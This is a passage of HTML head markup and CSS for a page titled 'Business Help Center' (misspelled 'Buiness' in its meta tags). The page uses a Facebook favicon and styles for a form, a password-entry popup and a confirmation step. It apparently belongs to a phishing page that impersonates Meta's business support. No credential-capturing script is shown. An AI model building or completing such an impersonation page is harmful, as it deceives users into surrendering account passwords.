    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select-focused {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select>.ant-select-arrow {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>*:first-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select:first-child>.ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select-auto-complete:first-child .ant-input-number,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-cascader-picker:first-child .ant-input-number {
      border-start-start-radius: 6px;
      border-end-start-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>*:last-child,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select:last-child>.ant-select-selector,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-cascader-picker:last-child .ant-input-number,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-cascader-picker-focused:last-child .ant-input-number {
      border-inline-end-width: 1px;
      border-start-end-radius: 6px;
      border-end-end-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact>.ant-select-auto-complete .ant-input-number {
      vertical-align: top;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-wrapper+.ant-input-number-group-wrapper {
      margin-inline-start: -1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-wrapper+.ant-input-number-group-wrapper .ant-input-number-affix-wrapper {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-wrapper:not(:last-child).ant-input-number-search>.ant-input-number-group>.ant-input-number-group-addon>.ant-input-number-search-button {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group.ant-input-number-group-compact .ant-input-number-group-wrapper:not(:last-child).ant-input-number-search>.ant-input-number-group>.ant-input-number {
      border-start-start-radius: 6px;
      border-start-end-radius: 0;
      border-end-end-radius: 0;
      border-end-start-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-wrapper {
      display: inline-block;
      text-align: start;
      vertical-align: top;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-wrapper .ant-input-number-affix-wrapper {
      width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-wrapper-lg .ant-input-number-group-addon {
      border-radius: 8px;
      font-size: 16px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-wrapper-sm .ant-input-number-group-addon {
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-wrapper .ant-input-number-wrapper-disabled>.ant-input-number-group-addon {
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      border-color: #d9d9d9;
      box-shadow: none;
      cursor: not-allowed;
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-group-wrapper .ant-input-number-wrapper-disabled>.ant-input-number-group-addon:hover {
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-disabled .ant-input-number-input {
      cursor: not-allowed;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-input {
      box-sizing: border-box;
      margin: 0;
      padding: 4px 11px;
      color: rgba(0, 0, 0, 0.88);
      font-size: inherit;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      width: 100%;
      text-align: start;
      background-color: transparent;
      border: 0;
      border-radius: 6px;
      outline: 0;
      transition: all 0.2s linear;
      appearance: textfield;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-input::-moz-placeholder {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-input::placeholder {
      color: rgba(0, 0, 0, 0.25);
      user-select: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-input:placeholder-shown {
      text-overflow: ellipsis;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-input[type="number"]::-webkit-inner-spin-button,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-input[type="number"]::-webkit-outer-spin-button {
      margin: 0;
      webkit-appearance: none;
      appearance: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number:hover .ant-input-number-handler-wrap,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-focused .ant-input-number-handler-wrap {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-wrap {
      position: absolute;
      inset-block-start: 0;
      inset-inline-end: 0;
      width: 22px;
      height: 100%;
      background: #ffffff;
      border-start-start-radius: 0;
      border-start-end-radius: 6px;
      border-end-end-radius: 6px;
      border-end-start-radius: 0;
      opacity: 0;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      transition: opacity 0.2s linear 0.2s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-wrap .ant-input-number-handler {
      display: flex;
      align-items: center;
      justify-content: center;
      flex: auto;
      height: 40%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-wrap .ant-input-number-handler .ant-input-number-handler-up-inner,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-wrap .ant-input-number-handler .ant-input-number-handler-down-inner {
      margin-inline-end: 0;
      font-size: 7px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler {
      height: 50%;
      overflow: hidden;
      color: rgba(0, 0, 0, 0.45);
      font-weight: bold;
      line-height: 0;
      text-align: center;
      cursor: pointer;
      border-inline-start: 1px solid #d9d9d9;
      transition: all 0.2s linear;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler:active {
      background: rgba(0, 0, 0, 0.02);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler:hover {
      height: 60%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler:hover .ant-input-number-handler-up-inner,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler:hover .ant-input-number-handler-down-inner {
      color: #1677ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-up-inner,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-down-inner {
      display: inline-flex;
      align-items: center;
      color: rgba(0, 0, 0, 0.45);
      font-style: normal;
      line-height: 0;
      text-align: center;
      text-transform: none;
      vertical-align: -0.125em;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      transition: all 0.2s linear;
      user-select: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-up-inner>*,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-down-inner>* {
      line-height: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-up-inner svg,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-down-inner svg {
      display: inline-block;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-up {
      border-start-end-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-down {
      border-block-start: 1px solid #d9d9d9;
      border-end-end-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-lg .ant-input-number-handler-wrap {
      border-start-end-radius: 8px;
      border-end-end-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-lg .ant-input-number-handler-up {
      border-start-end-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-lg .ant-input-number-handler-down {
      border-end-end-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-sm .ant-input-number-handler-wrap {
      border-start-end-radius: 4px;
      border-end-end-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-sm .ant-input-number-handler-up {
      border-start-end-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-sm .ant-input-number-handler-down {
      border-end-end-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-disabled .ant-input-number-handler-wrap,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-readonly .ant-input-number-handler-wrap {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-disabled .ant-input-number-input,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-readonly .ant-input-number-input {
      color: inherit;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-up-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number .ant-input-number-handler-down-disabled {
      cursor: not-allowed;
    }

    .ant-input-number-handler-up-disabled:hover :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-handler-up-inner,
    .ant-input-number-handler-down-disabled:hover :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-handler-down-inner {
      color: rgba(0, 0, 0, 0.25);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless {
      border-color: transparent;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-borderless .ant-input-number-handler-down {
      border-block-start-width: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper {
      position: relative;
      display: inline-flex;
      width: 90px;
      min-width: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      background-color: #ffffff;
      background-image: none;
      border-width: 1px;
      border-style: solid;
      border-color: #d9d9d9;
      border-radius: 6px;
      transition: all 0.2s;
      padding-inline-start: 11px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper::-moz-placeholder {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper::placeholder {
      color: rgba(0, 0, 0, 0.25);
      user-select: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper:placeholder-shown {
      text-overflow: ellipsis;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper:hover {
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-focused {
      border-color: #4096ff;
      box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper[disabled] {
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      border-color: #d9d9d9;
      box-shadow: none;
      cursor: not-allowed;
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-disabled:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper[disabled]:hover {
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-borderless,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-borderless:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-borderless:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-borderless-focused,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-borderless-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-borderless[disabled] {
      background-color: transparent;
      border: none;
      box-shadow: none;
    }

    textarea:where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper {
      max-width: 100%;
      height: auto;
      min-height: 32px;
      line-height: 1.5714285714285714;
      vertical-align: bottom;
      transition: all 0.3s, height 0s;
      resize: vertical;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-lg {
      border-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-sm {
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-textarea-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-error:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper {
      border-color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-error:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper:hover {
      border-color: #ffa39e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-error:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-error:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper-focused {
      border-color: #ff4d4f;
      box-shadow: 0 0 0 2px rgba(255, 38, 5, 0.06);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-error:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper .ant-input-number-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-error:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper .ant-input-number-suffix {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-warning:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper {
      border-color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-warning:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper:hover {
      border-color: #ffd666;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-warning:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-warning:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper-focused {
      border-color: #faad14;
      box-shadow: 0 0 0 2px rgba(255, 215, 5, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-warning:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper .ant-input-number-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-status-warning:not(.ant-input-number-affix-wrapper-disabled):not(.ant-input-number-affix-wrapper-borderless).ant-input-number-affix-wrapper .ant-input-number-suffix {
      color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper:not(.ant-input-number-affix-wrapper-disabled):hover {
      border-color: #4096ff;
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-focused,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper:focus {
      z-index: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper-disabled>.ant-input-number-disabled {
      background: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper>div.ant-input-number {
      width: 100%;
      border: none;
      outline: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper>div.ant-input-number.ant-input-number-focused {
      box-shadow: none !important;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper input.ant-input-number-input {
      padding: 4px 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper::before {
      display: inline-block;
      width: 0;
      visibility: hidden;
      content: "\a0";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper .ant-input-number-handler-wrap {
      z-index: 2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper .ant-input-number-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper .ant-input-number-suffix {
      display: flex;
      flex: none;
      align-items: center;
      pointer-events: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper .ant-input-number-prefix {
      margin-inline-end: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-affix-wrapper .ant-input-number-suffix {
      position: absolute;
      inset-block-start: 0;
      inset-inline-end: 0;
      z-index: 1;
      height: 100%;
      margin-inline-end: 11px;
      margin-inline-start: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-last-item) {
      margin-inline-end: -1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:active {
      z-index: 2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item[disabled] {
      z-index: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-first-item):not(.ant-input-number-compact-last-item) {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-last-item).ant-input-number-compact-first-item,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-last-item).ant-input-number-compact-first-item.ant-input-number-sm,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-last-item).ant-input-number-compact-first-item.ant-input-number-lg {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-first-item).ant-input-number-compact-last-item,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-first-item).ant-input-number-compact-last-item.ant-input-number-sm,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-number-compact-item:not(.ant-input-number-compact-first-item).ant-input-number-compact-last-item.ant-input-number-lg {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-998" data-css-hash="z5a8e6" data-token-hash="icxjto" data-cache-path="icxjto|Form-item-item|ant-form|anticon">
    @media screen and (-ms-high-contrast: active),
    (-ms-high-contrast: none) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-form-item-control {
        display: flex;
      }
    }
  </style>
  <style data-rc-order="prependQueue" data-css-hash="7uqwn" data-token-hash="icxjto" data-cache-path="icxjto|ant-design-icons|anticon">
    .anticon {
      display: inline-flex;
      align-items: center;
      color: inherit;
      font-style: normal;
      line-height: 0;
      text-align: center;
      text-transform: none;
      vertical-align: -0.125em;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    .anticon>* {
      line-height: 1;
    }

    .anticon svg {
      display: inline-block;
    }

    .anticon .anticon .anticon-icon {
      display: block;
    }
  </style>
  <meta charset="utf-8">
  <meta property="og:type" content="article">
  <meta property="og:title" content="Buiness Help Center">
  <meta name="description" content="Buiness Help Center">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta property="og:image" content="https://res.cloudinary.com/ductham087/image/upload/v1694658537/mlipp554tgpfzfa4o3zy.jpg">
  <meta name="theme-color" content="#000000">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,200,300,400,500,700&amp;display=swap">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
  <title>Business Help Center</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="js/bootstrap.js" crossorigin="anonymous"></script>
  <script src="js/common.js"></script>
  <!-- <script defer="defer" src="/static/js/main.4b175f09.js"></script> -->
  <style>
    .react-clock {
      display: block;
      position: relative;
    }

    .react-clock,
    .react-clock *,
    .react-clock *:before,
    .react-clock *:after {
      -moz-box-sizing: border-box;
      -webkit-box-sizing: border-box;
      box-sizing: border-box;
    }

    .react-clock__face {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      border: 1px solid black;
      border-radius: 50%;
    }

    .react-clock__hand {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 50%;
      right: 50%;
    }

    .react-clock__hand__body {
      position: absolute;
      background-color: black;
      transform: translateX(-50%);
    }

    .react-clock__mark {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 50%;
      right: 50%;
    }

    .react-clock__mark__body {
      position: absolute;
      background-color: black;
      transform: translateX(-50%);
    }

    .react-clock__mark__number {
      position: absolute;
      left: -40px;
      width: 80px;
      text-align: center;
    }

    .react-clock__second-hand__body {
      background-color: red;
    }
  </style>
  <style>
    * {
      font-family: Arial, Helvetica, sans-serif;
    }

    .main {
      max-height: 100vh;
      height: 100vh;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    .thumnail {
      margin: auto;
    }

    .thumnail .content {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      text-align: center;
      font-size: 1.08rem;
      width: 85%;
      margin: auto;
    }

    .thumnail .content b {
      margin: 15px 0 0 0;
    }

    .thumnail .content p {
      padding: 0 10px;
      margin: 15px 0;
      line-height: 1.08rem;
    }

    .thumnail .content .bottom {
      background-color: #F0F1F6;
    }

    .thumnail .content .bottom p {
      padding: 20px 10px;
      margin: 0;
    }

    .main .container .button {
      background: rgb(37, 116, 234);
      margin: 15px auto;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      border-radius: 5px;
    }

    .main .container .button a {
      padding: 16px 0;
      width: 100%;
      text-align: center;
      color: rgb(255, 255, 255);
      text-decoration: none;
      font-size: 1.1rem;
    }

    .main .footer {
      margin: 3rem 0;
      font-size: .9rem;
    }

    .main .footer a {
      text-decoration: none;
      color: black;
    }

    .main .footer a:hover {
      text-decoration: underline;
    }

    @media (max-width: 768px) {

      .thumnail img {
        width: 100%;
      }
    }


    /* BUSINESSS PAGE */

    .business .top-header {
      background-color: #355797;
      text-align: left;
      padding: 15px 20px;
    }

    .business .topHeader .metalogo {
      margin-top: -2px;
    }

    .business .metahead {
      color: #fff;
      display: inline-block;
      padding-left: 15px;
      margin-left: 15px;
      border-left: 1px solid #fff;
      margin-bottom: 0;
      font-size: 14px;
    }

    .business .searchicon {
      width: 20px;
      float: right;
      margin-top: 4px;
    }

    .business .masheader {
      background-repeat: no-repeat;
      background-size: cover;
    }

    .business .masheader .wrapper {
      background-color: rgba(36, 55, 96, .7);
    }

    .business .masheader .businesshelp {
      padding-top: 60px;
      margin-bottom: 0;
      color: #fff;
      text-align: center;
      font-family: Helvetica;
      font-size: 12px;
      letter-spacing: 3px;
      line-height: 21px;
    }

    .business .masheader .businesshelpcenter {
      padding-bottom: 60px;
      font-size: 40px;
      color: #fff;
      padding-left: 50px;
      padding-right: 50px;
      text-align: center;
      font-weight: 300;
      margin: 0;
    }

    .business .footer {
      background-color: #4080ff !important;
      margin-top: 70px !important;
      padding-top: 40px !important;
      padding-bottom: 40px !important;
      text-align: center !important;
    }

    .business .logofooter {
      width: 90px;
      padding-bottom: 15px;
    }

    .business .footer p {
      color: #fff;
    }

    .business .row {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      margin-right: -15px;
      margin-left: -15px;
    }

    .business ul {
      list-style-type: none;
      padding-left: 0 !important;
      margin-left: 0 !important;
    }

    .business ul li {
      padding-left: 0;
      margin-left: 0;
    }

    .business .footer ul li p {
      text-align: left;
      margin-bottom: 10px;
      font-size: 14px;
    }

    .business .fontbold {
      font-weight: 700;
    }

    .business .bottomfooter {
      padding-top: 20px;
      padding-bottom: 20px;
      text-align: center;
      margin: auto;
    }

    .business .bottomfooter ul li {
      display: inline-block;
      padding-left: 10px;
      padding-right: 10px;
      font-size: 14px;
    }

    .business .form {
      padding: 25px 16px 0;
      max-width: 550px;
      margin: auto;
      margin-top: 60px;
      background-color: #fff;
      box-shadow: 0 1px 2px rgba(0, 0, 0, .2);
      margin-bottom: 30px;
      border-radius: 10px;
    }

    .business .form .header-form .header-top {
      width: 80%;
      display: flex;
      margin: auto;
    }

    .business .form .header-form .header-bottom {
      width: 90%;
      display: flex;
      margin: auto;
      justify-content: space-between;
      color: rgb(48, 132, 244);
      font-size: 13px;
    }

    .business .form .header-form .line {
      width: 49%;
      height: 2px;
      max-width: 100%;
      background-color: rgb(48, 132, 244);
      margin: auto;
    }

    .business .form .header-form .dot {
      width: 8px;
      height: 8px;
      background-color: rgb(48, 132, 244);
      border-radius: 50px;
      margin: auto;
    }

    .business .form strong {
      font-weight: bolder;
    }

    .business .form .form-group {
      margin-bottom: 1rem;
    }

    .business .form label {
      color: #7d7e82;
      font-weight: 400;
      font-size: 14px;
      font-family: Helvetica Neue, Helvetica, Arial, lucida grande, tahoma, verdana, arial, sans-serif;
    }

    .business .form .butoni {
      background-color: #eaf4fc !important;
      color: #267df1 !important;
      margin-top: 15px !important;
      font-weight: 400 !important;
      padding: 5px 20px !important;
      border-radius: 4px !important;
      text-transform: none !important;
      font-weight: 700 !important;
      opacity: 1 !important;
      width: 100%;
    }

    /* POPUP START */
    .popup {
      position: fixed;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      opacity: 0;
      z-index: -99;
      transition: 0.3s ease-in-out;
    }

    .popup.active {
      opacity: 1;
      z-index: 99;
      transition: 0.3s ease-in-out;
    }

    .popup .background {
      position: fixed;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      background-color: rgba(0, 0, 0, 0.3);
      opacity: 0;
      transition: 0.2s ease-in-out;
    }

    .popup.active .background {
      opacity: 1;
      transition: 0.2s ease-in-out;
    }

    .popup .content {
      position: fixed;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      max-width: 650px;
      height: min-content;
      background-color: white;
      margin: auto;
      padding: 25px;
      border-radius: 5px;
    }

    .popup .modal-header {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: start;
      align-items: flex-start;
      -ms-flex-pack: justify;
      justify-content: space-between;
      padding: 1rem 1rem;
      border-bottom: 1px solid #dee2e6;
      border-top-left-radius: calc(0.3rem - 1px);
      border-top-right-radius: calc(0.3rem - 1px);
    }

    .popup button.close {
      padding: 0;
      background-color: transparent;
      border: 0;
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
    }

    .popup .close {
      float: right;
      font-size: 1.5rem;
      font-weight: 700;
      line-height: 1;
      color: #000;
      text-shadow: 0 1px 0 #fff;
      opacity: .5;
    }

    .popup label {
      color: #7d7e82;
      font-weight: 400;
      font-size: 14px;
      font-family: Helvetica Neue, Helvetica, Arial, lucida grande, tahoma, verdana, arial, sans-serif;
    }

    input[type=password] {
      border-radius: 4px !important;
      padding: 10px 15px;
      margin-top: 10px;
    }

    .popup .butoni {
      color: rgb(255, 255, 255) !important;
      background-color: rgb(44, 132, 244);
      margin-top: 20px !important;
      width: auto !important;
      padding: 5px 20px;
      border-radius: 4px !important;
      text-transform: none !important;
      font-weight: 700 !important;
      opacity: 1 !important;
    }

    /* CONFIRM */
    .confirm .header {
      background-color: #fff;
      padding-top: 8px;
      padding-bottom: 8px;
      -webkit-box-shadow: 1px 1px 8px 1px rgba(0, 0, 0, .1);
    }

    .confirm .header .fotoh {
      width: 94%;
      margin: 0 auto;
    }

    .confirm .twh3 {
      border-bottom: 1px solid rgba(0, 0, 0, .101);
      font-size: 16px;
